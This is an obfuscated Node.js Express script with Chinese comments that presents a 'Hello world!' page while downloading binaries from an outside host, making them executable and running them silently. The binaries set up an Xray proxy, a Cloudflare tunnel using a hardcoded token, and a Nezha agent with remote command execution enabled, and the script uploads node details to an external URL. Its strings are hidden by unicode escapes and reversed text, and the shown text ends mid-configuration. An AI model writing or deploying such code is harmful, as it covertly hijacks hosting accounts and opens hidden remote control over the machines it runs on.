let _0xb20ca;const express=require("\u0065\u0078\u0070\u0072\u0065\u0073\u0073");_0xb20ca=(577753^577744)+(664883^664887);const app=express();const axios=require("\u0061\u0078\u0069\u006F\u0073");var _0xe_0x29e=(502172^502165)+(434795^434794);const os=require("\u006F\u0073");_0xe_0x29e=(767074^767076)+(306430^306427);var _0x83026b=(422021^422016)+(308497^308501);const fs=require("\u0066\u0073");_0x83026b=630540^630543;let _0x4a976f;const path=require("\u0070\u0061\u0074\u0068");_0x4a976f=(577068^577065)+(297128^297131);const{"promisify":promisify}=require("\u0075\u0074\u0069\u006C");var _0xabc85a=(713635^713636)+(131881^131884);const exec=promisify(require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073")['\u0065\u0078\u0065\u0063']);_0xabc85a='\u006C\u0061\u006C\u0067\u006B\u0068';const{'\u0065\u0078\u0065\u0063\u0053\u0079\u006E\u0063':execSync}=require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073");// 只填写UPLOAD_URL将上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅
const UPLOAD_URL=process['\u0065\u006E\u0076']['\u0055\u0050\u004C\u004F\u0041\u0044\u005F\u0055\u0052\u004C']||'';// 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.xxx.com
const PROJECT_URL=process['\u0065\u006E\u0076']['\u0050\u0052\u004F\u004A\u0045\u0043\u0054\u005F\u0055\u0052\u004C']||'';// 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
const AUTO_ACCESS=process['\u0065\u006E\u0076']['\u0041\u0055\u0054\u004F\u005F\u0041\u0043\u0043\u0045\u0053\u0053']||false;// false关闭自动保活，true开启,需同时填写PROJECT_URL变量
const FILE_PATH=process['\u0065\u006E\u0076']['\u0046\u0049\u004C\u0045\u005F\u0050\u0041\u0054\u0048']||"\u002E\u002F\u0074\u006D\u0070";// 运行目录,sub节点文件保存目录
let _0xb90g;const SUB_PATH=process['\u0065\u006E\u0076']['\u0053\u0055\u0042\u005F\u0050\u0041\u0054\u0048']||"\u006C\u0075\u006F\u0068\u0061\u006F\u0031\u0032\u0033";// 订阅路径
_0xb90g=520816^520821;const PORT=process['\u0065\u006E\u0076']['\u0053\u0045\u0052\u0056\u0045\u0052\u005F\u0050\u004F\u0052\u0054']||process['\u0065\u006E\u0076']['\u0050\u004F\u0052\u0054']||884075^882387;// http服务订阅端口
const UUID=process['\u0065\u006E\u0076']['\u0055\u0055\u0049\u0044']||"f54a7e6377da-8d1a-1c44-17e6-d8603642".split("").reverse().join("");// 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
var _0x1e8gcc=(158746^158738)+(762661^762662);const NEZHA_SERVER=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0053\u0045\u0052\u0056\u0045\u0052']||'';// 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
_0x1e8gcc=(703946^703939)+(303044^303053);const NEZHA_PORT=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0050\u004F\u0052\u0054']||'';// 使用哪吒v1请留空，哪吒v0需填写
const NEZHA_KEY=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u004B\u0045\u0059']||'';// 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
var _0xeba=(553680^553680)+(179309^179308);const ARGO_DOMAIN=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0044\u004F\u004D\u0041\u0049\u004E']||"\u006C\u0069\u006E\u0061\u002E\u0065\u006D\u006D\u0079\u0030\u0032\u002E\u0064\u0070\u0064\u006E\u0073\u002E\u006F\u0072\u0067";// 固定隧道域名,留空即启用临时隧道
_0xeba=784328^784328;const ARGO_AUTH=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0041\u0055\u0054\u0048']||"9JiaGRkWtZ0VaRTWqlFMZdVW0FlaZdXSXxEbadVTwATeORTQ61EdFJTT5VERPFTWtplI6IyciwiIhhTZ3EmNiNDNyYzYtITOmhTLiJzM00CO5UGNtUTN1ImNjRDMiojI0JCLiMjN1YzYmZTNmRjZhVjNmZDN2UjNhVjY5QGNjZmNlZTOiojIhJye".split("").reverse().join("");// 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://json.zone.id
const ARGO_PORT=process['\u0065\u006E\u0076']['\u0041\u0052\u0047\u004F\u005F\u0050\u004F\u0052\u0054']||112209^108816;// 固定隧道端口,使用token需在cloudflare后台设置和这里一致
var _0xa5bab=(781537^781540)+(971654^971649);const CFIP=process['\u0065\u006E\u0076']['\u0043\u0046\u0049\u0050']||"\u0063\u0064\u006E\u0073\u002E\u0064\u006F\u006F\u006E\u002E\u0065\u0075\u002E\u006F\u0072\u0067";// 节点优选域名或优选ip  
_0xa5bab=(784252^784250)+(562074^562073);const CFPORT=process['\u0065\u006E\u0076']['\u0043\u0046\u0050\u004F\u0052\u0054']||453004^452663;// 节点优选域名或优选ip对应的端口
const NAME=process['\u0065\u006E\u0076']['\u004E\u0041\u004D\u0045']||"trdvuygz".split("").reverse().join("");// 节点名称
// 创建运行文件夹
if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](FILE_PATH)){fs['\u006D\u006B\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH);console['\u006C\u006F\u0067'](`${FILE_PATH} is created`);}else{console['\u006C\u006F\u0067'](`${FILE_PATH} already exists`);}// 生成随机6位字符文件名
function generateRandomName(_0x54f,_0xcdf5ea){var _0xbda40g=(832465^832467)+(136780^136780);_0x54f="\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006A\u006B\u006C\u006D\u006E\u006F\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007A";_0xbda40g=(553532^553532)+(930257^930256);_0xcdf5ea='';for(let i=100593^100593;i<(744336^744342);i++){_0xcdf5ea+=_0x54f['\u0063\u0068\u0061\u0072\u0041\u0074'](Math['\u0066\u006C\u006F\u006F\u0072'](Math['\u0072\u0061\u006E\u0064\u006F\u006D']()*_0x54f['\u006C\u0065\u006E\u0067\u0074\u0068']));}return _0xcdf5ea;}// 全局常量
const npmName=generateRandomName();const webName=generateRandomName();var _0x9f1cfc=(172365^172364)+(500665^500667);const botName=generateRandomName();_0x9f1cfc="fmnhbj".split("").reverse().join("");let _0x2g4a;const phpName=generateRandomName();_0x2g4a=472847^472841;let _0xe1f71g;let npmPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,npmName);_0xe1f71g=(442112^442115)+(518776^518781);let phpPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,phpName);let webPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,webName);var _0xga_0x26a=(129525^129525)+(776708^776710);let botPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,botName);_0xga_0x26a=(111259^111260)+(360965^360972);let subPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"txt.bus".split("").reverse().join(""));let listPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u006C\u0069\u0073\u0074\u002E\u0074\u0078\u0074");var _0x87dd=(802170^802172)+(658470^658468);let bootLogPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0062\u006F\u006F\u0074\u002E\u006C\u006F\u0067");_0x87dd=792054^792050;let configPath=path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u006A\u0073\u006F\u006E");// 如果订阅器上存在历史运行节点则先删除
function deleteNodes(){try{if(!UPLOAD_URL)return;if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](subPath))return;let _0xg15d;try{_0xg15d=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,"\u0075\u0074\u0066\u002D\u0038");}catch{return null;}var _0xbe_0xdcc=(863012^863012)+(955394^955397);const _0x56f=Buffer['\u0066\u0072\u006F\u006D'](_0xg15d,"\u0062\u0061\u0073\u0065\u0036\u0034")['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0075\u0074\u0066\u002D\u0038");_0xbe_0xdcc='\u0063\u006E\u006B\u006F\u0068\u0066';const _0xgc65a=_0x56f['\u0073\u0070\u006C\u0069\u0074']("\u000A")['\u0066\u0069\u006C\u0074\u0065\u0072'](line=>new RegExp("/\\/\\:)ciut|2airetsyh|najort|ssemv|sselv(".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](line));if(_0xgc65a['\u006C\u0065\u006E\u0067\u0074\u0068']===(259741^259741))return;axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/delete-nodes`,JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079']({"nodes":_0xgc65a}),{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}})['\u0063\u0061\u0074\u0063\u0068'](error=>{return null;});return null;}catch(err){return null;}}// 清理历史文件
function cleanupOldFiles(){try{let _0x327d;const _0xd84c1b=fs['\u0072\u0065\u0061\u0064\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH);_0x327d=(691094^691091)+(505498^505491);_0xd84c1b['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](file=>{const _0xab73f=path['\u006A\u006F\u0069\u006E'](FILE_PATH,file);try{var _0xc253b=(787834^787835)+(872546^872548);const _0xd721g=fs['\u0073\u0074\u0061\u0074\u0053\u0079\u006E\u0063'](_0xab73f);_0xc253b=(433312^433320)+(391411^391412);if(_0xd721g['\u0069\u0073\u0046\u0069\u006C\u0065']()){fs['\u0075\u006E\u006C\u0069\u006E\u006B\u0053\u0079\u006E\u0063'](_0xab73f);}}catch(err){// 忽略所有错误，不记录日志
}});}catch(err){// 忽略所有错误，不记录日志
}}// 根路由
app['\u0067\u0065\u0074']("\u002F",function(req,res){res['\u0073\u0065\u006E\u0064']("!dlrow olleH".split("").reverse().join(""));});// 生成xr-ay配置文件
async function generateConfig(){const _0x39161a={'\u006C\u006F\u0067':{'\u0061\u0063\u0063\u0065\u0073\u0073':"\u002F\u0064\u0065\u0076\u002F\u006E\u0075\u006C\u006C",'\u0065\u0072\u0072\u006F\u0072':"\u002F\u0064\u0065\u0076\u002F\u006E\u0075\u006C\u006C",'\u006C\u006F\u0067\u006C\u0065\u0076\u0065\u006C':'none'},"inbounds":[{"port":ARGO_PORT,"protocol":"\u0076\u006C\u0065\u0073\u0073",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0063\u006C\u0069\u0065\u006E\u0074\u0073':[{"id":UUID,'\u0066\u006C\u006F\u0077':'xtls-rprx-vision'}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"\u006E\u006F\u006E\u0065","fallbacks":[{'\u0064\u0065\u0073\u0074':3001},{'\u0070\u0061\u0074\u0068':"\u002F\u0076\u006C\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F",'\u0064\u0065\u0073\u0074':3002},{'\u0070\u0061\u0074\u0068':"\u002F\u0076\u006D\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F","dest":3003},{'\u0070\u0061\u0074\u0068':"/trojan-argo",'\u0064\u0065\u0073\u0074':3004}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0074\u0063\u0070"}},{"port":3001,'\u006C\u0069\u0073\u0074\u0065\u006E':"127.0.0.1",'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0076\u006C\u0065\u0073\u0073",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0063\u006C\u0069\u0065\u006E\u0074\u0073':[{'\u0069\u0064':UUID}],"decryption":"none"},"streamSettings":{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"tcp",'\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079':"\u006E\u006F\u006E\u0065"}},{'\u0070\u006F\u0072\u0074':3002,'\u006C\u0069\u0073\u0074\u0065\u006E':"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031","protocol":"\u0076\u006C\u0065\u0073\u0073","settings":{"clients":[{'\u0069\u0064':UUID,'\u006C\u0065\u0076\u0065\u006C':0}],'\u0064\u0065\u0063\u0072\u0079\u0070\u0074\u0069\u006F\u006E':"\u006E\u006F\u006E\u0065"},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"network":"\u0077\u0073",'\u0073\u0065\u0063\u0075\u0072\u0069\u0074\u0079':"\u006E\u006F\u006E\u0065","wsSettings":{"path":"\u002F\u0076\u006C\u0065\u0073\u0073\u002D\u0061\u0072\u0067\u006F"}},"sniffing":{'\u0065\u006E\u0061\u0062\u006C\u0065\u0064':!![],"destOverride":["\u0068\u0074\u0074\u0070","\u0074\u006C\u0073","\u0071\u0075\u0069\u0063"],'\u006D\u0065\u0074\u0061\u0064\u0061\u0074\u0061\u004F\u006E\u006C\u0079':false}},{'\u0070\u006F\u0072\u0074':3003,'\u006C\u0069\u0073\u0074\u0065\u006E':"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031","protocol":"\u0076\u006D\u0065\u0073\u0073","settings":{"clients":[{'\u0069\u0064':UUID,"alterId":0}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0077\u0073",'\u0077\u0073\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u0070\u0061\u0074\u0068':"/vmess-argo"}},'\u0073\u006E\u0069\u0066\u0066\u0069\u006E\u0067':{'\u0065\u006E\u0061\u0062\u006C\u0065\u0064':!![],'\u0064\u0065\u0073\u0074\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065':["ptth".split("").reverse().join(""),"\u0074\u006C\u0073","\u0071\u0075\u0069\u0063"],"metadataOnly":false}},{"port":3004,'\u006C\u0069\u0073\u0074\u0065\u006E':"\u0031\u0032\u0037\u002E\u0030\u002E\u0030\u002E\u0031",'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"trojan",'\u0073\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"clients":[{'\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064':UUID}]},'\u0073\u0074\u0072\u0065\u0061\u006D\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{'\u006E\u0065\u0074\u0077\u006F\u0072\u006B':"\u0077\u0073","security":"none",'\u0077\u0073\u0053\u0065\u0074\u0074\u0069\u006E\u0067\u0073':{"path":"/trojan-argo"}},'\u0073\u006E\u0069\u0066\u0066\u0069\u006E\u0067':{"enabled":!![],'\u0064\u0065\u0073\u0074\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065':["ptth".split("").reverse().join(""),"\u0074\u006C\u0073","\u0071\u0075\u0069\u0063"],"metadataOnly":false}}],'\u0064\u006E\u0073':{"servers":["\u0068\u0074\u0074\u0070\u0073\u002B\u006C\u006F\u0063\u0061\u006C\u003A\u002F\u002F\u0038\u002E\u0038\u002E\u0038\u002E\u0038\u002F\u0064\u006E\u0073\u002D\u0071\u0075\u0065\u0072\u0079"]},"outbounds":[{"protocol":"freedom","tag":"direct"},{'\u0070\u0072\u006F\u0074\u006F\u0063\u006F\u006C':"\u0062\u006C\u0061\u0063\u006B\u0068\u006F\u006C\u0065",'\u0074\u0061\u0067':"block"}]};fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u006A\u0073\u006F\u006E"),JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079'](_0x39161a,null,659399^659397));}// 判断系统架构
function getSystemArchitecture(){const _0x1fa74a=os['\u0061\u0072\u0063\u0068']();if(_0x1fa74a==="\u0061\u0072\u006D"||_0x1fa74a==="46mra".split("").reverse().join("")||_0x1fa74a==="\u0061\u0061\u0072\u0063\u0068\u0036\u0034"){return"\u0061\u0072\u006D";}else{return"dma".split("").reverse().join("");}}// 下载对应系统架构的依赖文件
function downloadFile(fileName,fileUrl,callback){const _0x704e=fileName;// 确保目录存在
if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](FILE_PATH)){fs['\u006D\u006B\u0064\u0069\u0072\u0053\u0079\u006E\u0063'](FILE_PATH,{'\u0072\u0065\u0063\u0075\u0072\u0073\u0069\u0076\u0065':!![]});}const _0x03026c=fs['\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0072\u0069\u0074\u0065\u0053\u0074\u0072\u0065\u0061\u006D'](_0x704e);axios({"method":'get','\u0075\u0072\u006C':fileUrl,"responseType":"\u0073\u0074\u0072\u0065\u0061\u006D"})['\u0074\u0068\u0065\u006E'](response=>{response['\u0064\u0061\u0074\u0061']['\u0070\u0069\u0070\u0065'](_0x03026c);_0x03026c['\u006F\u006E']("hsinif".split("").reverse().join(""),()=>{_0x03026c['\u0063\u006C\u006F\u0073\u0065']();console['\u006C\u006F\u0067'](`Download ${path['\u0062\u0061\u0073\u0065\u006E\u0061\u006D\u0065'](_0x704e)} successfully`);callback(null,_0x704e);});_0x03026c['\u006F\u006E']("rorre".split("").reverse().join(""),err=>{fs['\u0075\u006E\u006C\u0069\u006E\u006B'](_0x704e,()=>{});var _0xdd349c=(602459^602460)+(607207^607200);const errorMessage=`Download ${path['\u0062\u0061\u0073\u0065\u006E\u0061\u006D\u0065'](_0x704e)} failed: ${err['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`;_0xdd349c=(658732^658724)+(826257^826259);console['\u0065\u0072\u0072\u006F\u0072'](errorMessage);// 下载失败时输出错误消息
callback(errorMessage);});})['\u0063\u0061\u0074\u0063\u0068'](err=>{var _0xgafa=(321215^321215)+(147807^147799);const errorMessage=`Download ${path['\u0062\u0061\u0073\u0065\u006E\u0061\u006D\u0065'](_0x704e)} failed: ${err['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`;_0xgafa=762475^762472;console['\u0065\u0072\u0072\u006F\u0072'](errorMessage);// 下载失败时输出错误消息
callback(errorMessage);});}// 下载并运行依赖文件
async function downloadFilesAndRun(_0xa4525b){var _0x756fa=(874331^874323)+(397833^397835);const _0x47c=getSystemArchitecture();_0x756fa=360183^360180;const _0x1gcbb=getFilesForArchitecture(_0x47c);if(_0x1gcbb['\u006C\u0065\u006E\u0067\u0074\u0068']===(838529^838529)){console['\u006C\u006F\u0067'](`Can't find a file for the current architecture`);return;}const _0xca96b=_0x1gcbb['\u006D\u0061\u0070'](fileInfo=>{return new Promise((resolve,reject)=>{downloadFile(fileInfo['\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065'],fileInfo['\u0066\u0069\u006C\u0065\u0055\u0072\u006C'],(err,filePath)=>{if(err){reject(err);}else{resolve(filePath);}});});});try{await Promise['\u0061\u006C\u006C'](_0xca96b);}catch(err){console['\u0065\u0072\u0072\u006F\u0072'](":selif gnidaolnwod rorrE".split("").reverse().join(""),err);return;}// 授权和运行
function _0x7e291f(filePaths,_0x4ffdeb){_0x4ffdeb=545643^545430;filePaths['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](absoluteFilePath=>{if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](absoluteFilePath)){fs['\u0063\u0068\u006D\u006F\u0064'](absoluteFilePath,_0x4ffdeb,err=>{if(err){console['\u0065\u0072\u0072\u006F\u0072'](`Empowerment failed for ${absoluteFilePath}: ${err}`);}else{console['\u006C\u006F\u0067'](`Empowerment success for ${absoluteFilePath}: ${_0x4ffdeb['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](950162^950170)}`);}});}});}const _0xbb_0xa75=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xa4525b='\u0070\u0068\u0062\u0063\u006E\u0071';_0x7e291f(_0xbb_0xa75);//运行ne-zha
if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){var _0x7d26b=(930836^930844)+(616245^616253);// 检测哪吒是否开启TLS
const _0xa7c=NEZHA_SERVER['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u003A")?NEZHA_SERVER['\u0073\u0070\u006C\u0069\u0074']("\u003A")['\u0070\u006F\u0070']():'';_0x7d26b='\u006B\u0068\u0063\u006E\u006F\u006B';var _0xd0f26c=(818503^818501)+(746642^746651);const tlsPorts=new Set(["\u0034\u0034\u0033","3448".split("").reverse().join(""),"6902".split("").reverse().join(""),"\u0032\u0030\u0038\u0037","\u0032\u0030\u0038\u0033","\u0032\u0030\u0035\u0033"]);_0xd0f26c=965533^965530;const _0x7b67af=tlsPorts['\u0068\u0061\u0073'](_0xa7c)?"eurt".split("").reverse().join(""):"eslaf".split("").reverse().join("");// 生成 config.yaml
const _0x73b03c=`
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${_0x7b67af}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C"),_0x73b03c);// 运行 v1
var _0xa1cc6a=(247478^247478)+(410923^410927);const command=`nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;_0xa1cc6a='\u0064\u0061\u006D\u0066\u0062\u006E';try{await exec(command);console['\u006C\u006F\u0067'](`${phpName} is running`);await new Promise(resolve=>setTimeout(resolve,946725^946637));}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`php running error: ${error}`);}}else{let _0x9278e;let _0xa5d='';_0x9278e=(398610^398618)+(346559^346550);const tlsPorts=["\u0034\u0034\u0033","3448".split("").reverse().join(""),"\u0032\u0030\u0039\u0036","\u0032\u0030\u0038\u0037","\u0032\u0030\u0038\u0033","3502".split("").reverse().join("")];if(tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](NEZHA_PORT)){_0xa5d="slt--".split("").reverse().join("");}const command=`nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${_0xa5d} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;try{await exec(command);console['\u006C\u006F\u0067'](`${npmName} is running`);await new Promise(resolve=>setTimeout(resolve,437846^437694));}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`npm running error: ${error}`);}}}else{console['\u006C\u006F\u0067']("gninnur piks,ytpme si elbairav AHZEN".split("").reverse().join(""));}//运行xr-ay
const _0xc72fa=`nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;try{await exec(_0xc72fa);console['\u006C\u006F\u0067'](`${webName} is running`);await new Promise(resolve=>setTimeout(resolve,729728^729448));}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`web running error: ${error}`);}// 运行cloud-fared
if(fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](botPath)){let _0xa5eecb;if(ARGO_AUTH['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u005E\u005B\u0041\u002D\u005A\u0030\u002D\u0039\u0061\u002D\u007A\u003D\u005D\u007B\u0031\u0032\u0030\u002C\u0032\u0035\u0030\u007D\u0024',""))){_0xa5eecb=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;}else if(ARGO_AUTH['\u006D\u0061\u0074\u0063\u0068'](new RegExp('\u0054\u0075\u006E\u006E\u0065\u006C\u0053\u0065\u0063\u0072\u0065\u0074',""))){_0xa5eecb=`tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;}else{_0xa5eecb=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;}try{await exec(`nohup ${botPath} ${_0xa5eecb} >/dev/null 2>&1 &`);console['\u006C\u006F\u0067'](`${botName} is running`);await new Promise(resolve=>setTimeout(resolve,724206^723774));}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`Error executing command: ${error}`);}}await new Promise(resolve=>setTimeout(resolve,611275^606275));}//根据系统架构返回对应的url
function getFilesForArchitecture(architecture,_0xe2bdc){if(architecture==="\u0061\u0072\u006D"){_0xe2bdc=[{'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':webPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0077\u0065\u0062"},{'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':botPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0062\u006F\u0074"}];}else{_0xe2bdc=[{'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':webPath,"fileUrl":"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0077\u0065\u0062"},{"fileName":botPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':"https://amd64.ssss.nyc.mn/bot"}];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xe7699a=architecture==="\u0061\u0072\u006D"?"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074":"tnega/nm.cyn.ssss.46dma//:sptth".split("").reverse().join("");_0xe2bdc['\u0075\u006E\u0073\u0068\u0069\u0066\u0074']({'\u0066\u0069\u006C\u0065\u004E\u0061\u006D\u0065':npmPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':_0xe7699a});}else{const _0xb19d7f=architecture==="\u0061\u0072\u006D"?"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031":"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";_0xe2bdc['\u0075\u006E\u0073\u0068\u0069\u0066\u0074']({"fileName":phpPath,'\u0066\u0069\u006C\u0065\u0055\u0072\u006C':_0xb19d7f});}}return _0xe2bdc;}// 获取固定隧道json
function argoType(){if(!ARGO_AUTH||!ARGO_DOMAIN){console['\u006C\u006F\u0067']("slennut kciuq esu ,ytpme si elbairav HTUA_OGRA ro NIAMOD_OGRA".split("").reverse().join(""));return;}if(ARGO_AUTH['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("terceSlennuT".split("").reverse().join(""))){fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0074\u0075\u006E\u006E\u0065\u006C\u002E\u006A\u0073\u006F\u006E"),ARGO_AUTH);const _0xe32fa=`
  tunnel: ${ARGO_AUTH['\u0073\u0070\u006C\u0069\u0074']("\u0022")[948255^948244]}
  credentials-file: ${path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0074\u0075\u006E\u006E\u0065\u006C\u002E\u006A\u0073\u006F\u006E")}
  protocol: http2
  
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
